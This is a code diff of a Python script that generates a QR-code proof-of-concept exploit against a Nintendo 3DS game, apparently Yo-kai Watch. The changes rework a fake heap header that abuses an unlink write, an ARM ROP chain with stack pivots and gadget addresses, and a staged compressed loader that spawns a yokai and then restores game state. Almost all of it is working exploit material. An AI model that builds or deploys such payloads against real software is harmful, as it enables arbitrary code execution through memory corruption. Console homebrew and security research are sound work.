@@ -25,77 +25,83 @@ NEXT_BLOCK_ADDR = N + 0x28 + N_CAP
 # Layout-specific addresses and output names.
 @dataclass(frozen=True)
 class Layout:
-    field_entry: int
-    exit_r8: int
+    qr_node: int
+    qr_request: int
     output: str
 
     @property
     def target_ref(self) -> int:
-        return self.field_entry + 0x14
+        return self.qr_node + 0x08
 
 
 LAYOUTS = {
     "old3ds": Layout(
-        field_entry=0x08E42A9C,
-        exit_r8=0x08E42A88,
+        qr_node=0x08E314AC,
+        qr_request=0x08E31874,
         output="ywb_qr_poc.png",
     ),
     "new3ds": Layout(
-        field_entry=0x0CA42A9C,
-        exit_r8=0x0CA42A88,
+        qr_node=0x08E314AC + 0x03C00000,
+        qr_request=0x08E31874 + 0x03C00000,
         output="ywb_qr_poc_new3ds.png",
     ),
 }
 
 # Game objects
 DEV = 0x006B8A60
+LOOP_OBJECT = 0x006B8028
+LOOP_MANAGER = 0x006B9A30
+LOOP_MANAGER_R6 = LOOP_MANAGER + 0x58
 
 # Game data
-ITEM_ID = 0xC96C4451  # Chocobar
-ITEM_QTY = 1
 YOKAI_PARAM_ID = 0xA3A68AA8  # Jibanyan
 
 # Functions and ROP gadgets for this game version.
 PIVOT = 0x0011E5A8  # Context load and stack pivot
 POP_R0_TO_R3_R10_PC = 0x0019F1C0  # POP {R0-R3,R10,PC}
-POP_LR_PC = 0x0011E5C0  # POP {LR,PC}
 STR_R0_R1 = 0x0010AF40  # STR R0,[R1]; BX LR
-LDR_R0_R1_PLUS4 = 0x0055CEB8  # LDR R0,[R1,#4]; BX LR
-ADD18 = 0x0013B724  # ADD R0,R0,#0x18; BX LR
-POP_R1_PC = 0x003005EC  # POP {R1,PC}
-POP_R0_PC = 0x00112234  # POP {R0,PC}
 FREE_BLOCK_FUNC = 0x0013F9E4  # Insert/coalesce a free block.
-DECOMPRESS_FUNC = 0x0016734C  # sub_16734C(dst, &out_size, capacity, src); LZ10
+DECOMPRESS_FUNC = 0x0016734C  # LZ10 decompress(dst, &out_size, capacity, src)
 CREATE_YOKAI_FUNC = 0x003747E8  # Create a yokai; incoming R0 is unused.
 RET_LR = 0x0056FE20  # BX LR
-ADD_ITEM_FUNC = 0x003C7144  # Add an item (R0 = ID, R1 = quantity).
+LOOP_END_REQUEST_FUNC = 0x0056D828  # Queue closure of the license registration Loop
+LIST_DISPATCH_FUNC = 0x0056C41C  # Release remaining QR-owned resources
+LIST_DISPATCH_A2 = 1
+LIST_DISPATCH_A3 = 1080
+CLEAR_QR_MODE = 0x0050537C  # LDR R0,[R5]; BIC R0,R0,#0x100000; STR R0,[R5] // Clear the QR mode flag
+QR_MODE_FLAG = 0x006BC6FC
 
 # Return stack and registers.
-EXIT_SP = 0x0FFFFEB8
-EXIT_PC = 0x0012AD08
-EXIT_R10 = 0x006B9028
-EXIT_R11 = 0x006B8B5C
+EXIT_SP = 0x0FFFFF38
+EXIT_PC = 0x0024E0C0
+EXIT_R9 = 0xFFFFFFFE
+EXIT_R10 = 0xFFFFFFFF
 
 # Payload object layout.
-PREFIX_LEN = 0x1B
-OBJ_LEN = 0x1D0
-STAGE1_OBJ_LEN = 0x60
-STAGE1_BLOB_OFF = 0x60
-STAGE2_CAP = (OBJ_LEN + 3) & ~3
-DST = B + 0x400
-OUT_SIZE = B + 0x3FC
-
 INITIAL_STACK_OFF = 0x078
-EXIT_CTX_OFF = 0x120
-# Yokai-creation and free-block contexts overlap; their used words are disjoint.
-YOKAI_CTX_OFF = 0x160
-FREE_CTX_OFF = 0x178
-FREE_STACK_OFF = 0x1B8
+FREE_STACK_OFF = 0x0A8
+YOKAI_STACK_OFF = 0x0C0
+LOOP_STACK_OFF = 0x0D8
+SECOND_STACK_OFF = 0x0F0
+CLEAR_RET_OFF = 0x108
+FREE_CTX_OFF = 0x130
+YOKAI_CTX_OFF = 0x170
+LOOP_CTX_OFF = 0x1B0
+SECOND_CTX_OFF = 0x1F0
+EXIT_CTX_OFF = 0x230
+OBJ_LEN = 0x270
 
 # QR image configuration.
 QR_VERSION = 16
 QR_ECC = ERROR_CORRECT_L
 QR_MASK = 1
+
+PREFIX_LEN = 0x1B
+STAGE1_OBJ_LEN = 0x60
+STAGE1_BLOB_OFF = 0x60
+STAGE2_CAP = (OBJ_LEN + 3) & ~3
+DST = B + 0x400
+OUT_SIZE = B + 0x3FC
 
 
 def p32(buf, off, val):
@@ -104,98 +110,96 @@ def p32(buf, off, val):
 
 def build_fake_object(layout: Layout, base: int):
     b = bytearray(OBJ_LEN)
-    object_addr = base
-    exit_r9_slot_addr = object_addr + EXIT_CTX_OFF + 0x24
 
-    # Payload object. PIVOT loads R0-R12 from base, then SP/LR/PC.
-    # base+0x20..base+0x74 doubles as the fake vtable.
-    # Slots not used by the chain must return safely (RET_LR = BX LR).
-    p32(b, 0x00, object_addr + 0x20)
-    p32(b, 0x14, 1)  # object data field, not used by the chain
-    for off in range(0x20, 0x78, 4):
-        p32(b, off, RET_LR)
-    p32(b, 0x34, object_addr + INITIAL_STACK_OFF)  # PIVOT: LR = new SP
-    p32(b, 0x3C, POP_R0_TO_R3_R10_PC)  # PIVOT: PC after stack move
-    p32(b, 0x40, PIVOT)  # [base]+0x20 -> [base+0x40]
+    def frame(off, r0, r1, r2, r3, pc):
+        p32(b, off + 0x00, r0)
+        p32(b, off + 0x04, r1)
+        p32(b, off + 0x08, r2)
+        p32(b, off + 0x0C, r3)
+        p32(b, off + 0x10, 0)
+        p32(b, off + 0x14, pc)
 
-    # Initial register load; R0-R3/R10 are unused here; PC=POP_LR_PC.
-    p32(b, INITIAL_STACK_OFF + 0x14, POP_LR_PC)
-    p32(b, INITIAL_STACK_OFF + 0x18, POP_R1_PC)  # POP_LR_PC LR
-    p32(b, INITIAL_STACK_OFF + 0x1C, POP_R1_PC)  # POP_LR_PC PC
+    # PIVOT: SP=+0x34, LR=+0x38, PC=+0x3C.
+    p32(b, 0x34, base + INITIAL_STACK_OFF)
+    p32(b, 0x38, POP_R0_TO_R3_R10_PC)
+    p32(b, 0x3C, POP_R0_TO_R3_R10_PC)
 
-    # Store [FIELD_ENTRY+4] + 0x30 in [TARGET_REF] and the exit R9 slot.
-    p32(b, INITIAL_STACK_OFF + 0x20, layout.field_entry)
-    p32(b, INITIAL_STACK_OFF + 0x24, LDR_R0_R1_PLUS4)  # LDR R0,[R1,#4]
-    p32(b, INITIAL_STACK_OFF + 0x28, ADD18)
-    p32(b, INITIAL_STACK_OFF + 0x2C, ADD18)  # ADD R0,R0,#0x18
-    p32(b, INITIAL_STACK_OFF + 0x30, layout.target_ref)
-    p32(b, INITIAL_STACK_OFF + 0x34, STR_R0_R1)  # [TARGET_REF] = R0
-    p32(b, INITIAL_STACK_OFF + 0x38, exit_r9_slot_addr)
-    p32(b, INITIAL_STACK_OFF + 0x3C, STR_R0_R1)  # [exit_r9_slot_addr] = R0
-    p32(b, INITIAL_STACK_OFF + 0x44, POP_R0_TO_R3_R10_PC)  # next: [N] = Dev
+    # [N] = Dev, then enter the free-block context.
+    frame(INITIAL_STACK_OFF, DEV, N, 0, 0, STR_R0_R1)
+    frame(0x090, base + FREE_CTX_OFF, 0, 0, 0, PIVOT)
 
-    # [N] = Dev. POP_R0_TO_R3_R10_PC preloads R0=Dev, R1=N; R2/R3/R10 are dead.
-    p32(b, INITIAL_STACK_OFF + 0x48, DEV)
-    p32(b, INITIAL_STACK_OFF + 0x4C, N)
-    p32(b, INITIAL_STACK_OFF + 0x5C, POP_LR_PC)
-    p32(b, INITIAL_STACK_OFF + 0x60, POP_R1_PC)  # STR_R0_R1 return
-    p32(b, INITIAL_STACK_OFF + 0x64, STR_R0_R1)
+    # Return frames: free N -> create yokai -> loop end -> list dispatch -> QR clear.
+    frame(FREE_STACK_OFF, base + YOKAI_CTX_OFF, 0, 0, 0, PIVOT)
+    frame(YOKAI_STACK_OFF, base + LOOP_CTX_OFF, 0, 0, 0, PIVOT)
+    frame(LOOP_STACK_OFF, base + SECOND_CTX_OFF, 0, 0, 0, PIVOT)
+    frame(SECOND_STACK_OFF, 0, 0, 0, 0, CLEAR_QR_MODE)
 
-    p32(b, INITIAL_STACK_OFF + 0x68, 0)
-    p32(b, INITIAL_STACK_OFF + 0x6C, POP_R0_PC)
-    p32(b, INITIAL_STACK_OFF + 0x70, object_addr + FREE_CTX_OFF)
-    p32(b, INITIAL_STACK_OFF + 0x74, PIVOT)
+    # QR clear: POP {R4-R6,PC}, then POP {R0-R3,R10,PC}.
+    p32(b, CLEAR_RET_OFF + 0x00, 0)  # R4
+    p32(b, CLEAR_RET_OFF + 0x04, 0)  # R5
+    p32(b, CLEAR_RET_OFF + 0x08, 0)  # R6
+    p32(b, CLEAR_RET_OFF + 0x0C, POP_R0_TO_R3_R10_PC)
+    frame(CLEAR_RET_OFF + 0x10, base + EXIT_CTX_OFF, 0, 0, 0, PIVOT)
 
-    # Return stack used after yokai creation.
-    # POP_R0_TO_R3_R10_PC consumes five register slots here; only R0 and PC are live.
-    p32(b, 0x100, object_addr + EXIT_CTX_OFF)
-    p32(b, 0x114, PIVOT)
-
-    # Exit context: add the item and return to the caller.
-    p32(b, EXIT_CTX_OFF + 0x00, ITEM_ID)
-    p32(b, EXIT_CTX_OFF + 0x04, ITEM_QTY)
-    p32(b, EXIT_CTX_OFF + 0x20, layout.exit_r8)
-    # EXIT_CTX_OFF+0x24 (exit R9) is filled by the chain.
-    p32(b, EXIT_CTX_OFF + 0x28, EXIT_R10)
-    p32(b, EXIT_CTX_OFF + 0x2C, EXIT_R11)
-    p32(b, EXIT_CTX_OFF + 0x34, EXIT_SP)
-    p32(b, EXIT_CTX_OFF + 0x38, EXIT_PC)
-    p32(b, EXIT_CTX_OFF + 0x3C, ADD_ITEM_FUNC)
-
-    # Yokai-creation context: R1=0, R2=YOKAI_PARAM_ID, R3=0.
-    # R0 and the other loaded registers are dead.
-    p32(b, YOKAI_CTX_OFF + 0x08, YOKAI_PARAM_ID)
-    p32(b, YOKAI_CTX_OFF + 0x34, object_addr + 0x100)
-    p32(b, YOKAI_CTX_OFF + 0x38, POP_R0_TO_R3_R10_PC)
-    p32(b, YOKAI_CTX_OFF + 0x3C, CREATE_YOKAI_FUNC)
-
-    # Free-block context: R0=DEV, R1=N, R2=0.
+    # free N: R0=Dev, R1=N.
     p32(b, FREE_CTX_OFF + 0x00, DEV)
     p32(b, FREE_CTX_OFF + 0x04, N)
-    p32(b, FREE_CTX_OFF + 0x34, object_addr + FREE_STACK_OFF)
+    p32(b, FREE_CTX_OFF + 0x34, base + FREE_STACK_OFF)
     p32(b, FREE_CTX_OFF + 0x38, POP_R0_TO_R3_R10_PC)
     p32(b, FREE_CTX_OFF + 0x3C, FREE_BLOCK_FUNC)
 
-    # Free-block return frame: load the yokai-creation context.
-    p32(b, FREE_STACK_OFF + 0x00, object_addr + YOKAI_CTX_OFF)
-    p32(b, FREE_STACK_OFF + 0x14, PIVOT)
+    # create yokai: R1=0, R2=YOKAI_PARAM_ID, R3=0.
+    p32(b, YOKAI_CTX_OFF + 0x04, 0)
+    p32(b, YOKAI_CTX_OFF + 0x08, YOKAI_PARAM_ID)
+    p32(b, YOKAI_CTX_OFF + 0x0C, 0)
+    p32(b, YOKAI_CTX_OFF + 0x34, base + YOKAI_STACK_OFF)
+    p32(b, YOKAI_CTX_OFF + 0x38, POP_R0_TO_R3_R10_PC)
+    p32(b, YOKAI_CTX_OFF + 0x3C, CREATE_YOKAI_FUNC)
+
+    # Queue closure of the license registration Loop: request=(E+0x958)|1, manager=E+0x1A08.
+    p32(b, LOOP_CTX_OFF + 0x00, LOOP_OBJECT)
+    p32(b, LOOP_CTX_OFF + 0x34, base + LOOP_STACK_OFF)
+    p32(b, LOOP_CTX_OFF + 0x38, POP_R0_TO_R3_R10_PC)
+    p32(b, LOOP_CTX_OFF + 0x3C, LOOP_END_REQUEST_FUNC)
+
+    # Release remaining QR-owned resources (E, 1, 1080).
+    p32(b, SECOND_CTX_OFF + 0x00, LOOP_OBJECT)
+    p32(b, SECOND_CTX_OFF + 0x04, LIST_DISPATCH_A2)
+    p32(b, SECOND_CTX_OFF + 0x08, LIST_DISPATCH_A3)
+    p32(b, SECOND_CTX_OFF + 0x10, 0)  # R4
+    p32(b, SECOND_CTX_OFF + 0x14, QR_MODE_FLAG)  # R5
+    p32(b, SECOND_CTX_OFF + 0x34, base + SECOND_STACK_OFF)
+    p32(b, SECOND_CTX_OFF + 0x38, POP_R0_TO_R3_R10_PC)
+    p32(b, SECOND_CTX_OFF + 0x3C, LIST_DISPATCH_FUNC)
+
+    # Exit context: resume at 0x24E0C0.
+    p32(b, EXIT_CTX_OFF + 0x00, 0)
+    p32(b, EXIT_CTX_OFF + 0x04, 0)
+    p32(b, EXIT_CTX_OFF + 0x10, layout.qr_node)
+    p32(b, EXIT_CTX_OFF + 0x14, layout.qr_request)
+    p32(b, EXIT_CTX_OFF + 0x18, LOOP_MANAGER_R6)
+    p32(b, EXIT_CTX_OFF + 0x1C, 0)
+    p32(b, EXIT_CTX_OFF + 0x20, 0)
+    p32(b, EXIT_CTX_OFF + 0x24, EXIT_R9)
+    p32(b, EXIT_CTX_OFF + 0x28, EXIT_R10)
+    p32(b, EXIT_CTX_OFF + 0x2C, layout.qr_node)
+    p32(b, EXIT_CTX_OFF + 0x34, EXIT_SP)
+    p32(b, EXIT_CTX_OFF + 0x38, EXIT_PC)
+    p32(b, EXIT_CTX_OFF + 0x3C, RET_LR)
 
     return b
 
 
 def build_fake_heap_header(layout: Layout):
     b = bytearray(40)
-    # ctrl=0: during the H0 free, sub_158AA0(Dev,N) sees [N]!=Dev and
-    # returns, so N stays in the physical list until the FREE_BLOCK_FUNC call.
-    # +0x10 (owner) is used only as the link base N+0x20/N+0x24; its value
-    # is never read. +0x14 is cleared by sub_13F9E4 before any read.
+    # fake free block: fd/bk unlink writes P to [qr_node+8].
     p32(b, 0x00, 0)
-    p32(b, 0x04, H0)  # prev physical block
-    p32(b, 0x08, NEXT_BLOCK_ADDR)  # next physical block
-    p32(b, 0x18, N_CAP)  # size used when H0+N are coalesced
-    p32(b, 0x1C, N_FLAGS)  # bit24 clear = free block
-    p32(b, 0x20, P)  # fake fd -> unlink writes [TARGET_REF]=P
-    p32(b, 0x24, layout.target_ref - 0x20)  # fake bk
+    p32(b, 0x04, H0)
+    p32(b, 0x08, NEXT_BLOCK_ADDR)
+    p32(b, 0x18, N_CAP)
+    p32(b, 0x1C, N_FLAGS)
+    p32(b, 0x20, P)
+    p32(b, 0x24, layout.target_ref - 0x20)
     return b
 
 
@@ -253,15 +257,14 @@ def build_compressed_blob(stage2):
 
 def build_stage1(stack_addr):
     b = bytearray(STAGE1_OBJ_LEN)
-    # Stage-1 loader. sub_12AB70 reads [P], then [P+0x40], and calls PIVOT.
+    # [P]=P+0x20; [[P]+0x0C]=[P+0x2C]=PIVOT.
     p32(b, 0x00, P + 0x20)
-    p32(b, 0x14, 1)
     for off in range(0x20, STAGE1_OBJ_LEN, 4):
         p32(b, off, RET_LR)
+    p32(b, 0x2C, PIVOT)
     p32(b, 0x34, stack_addr)
     p32(b, 0x38, POP_R0_TO_R3_R10_PC)
     p32(b, 0x3C, POP_R0_TO_R3_R10_PC)
-    p32(b, 0x40, PIVOT)
     return b
 
 
@@ -272,8 +275,8 @@ def build_first_segment(layout: Layout):
     stage1_off = PREFIX_LEN
     blob_off = stage1_off + STAGE1_OBJ_LEN
     blob_end = blob_off + len(blob)
-    # Leave the decompressor's 0x24-byte stack push below SP clear.
-    stack_off = blob_end + 0x24
+    # The decompressor uses 0x40 bytes below SP.
+    stack_off = blob_end + 0x40
     while (B + 37 + stack_off) & 3:
         stack_off += 1
     stack_addr = B + 37 + stack_off
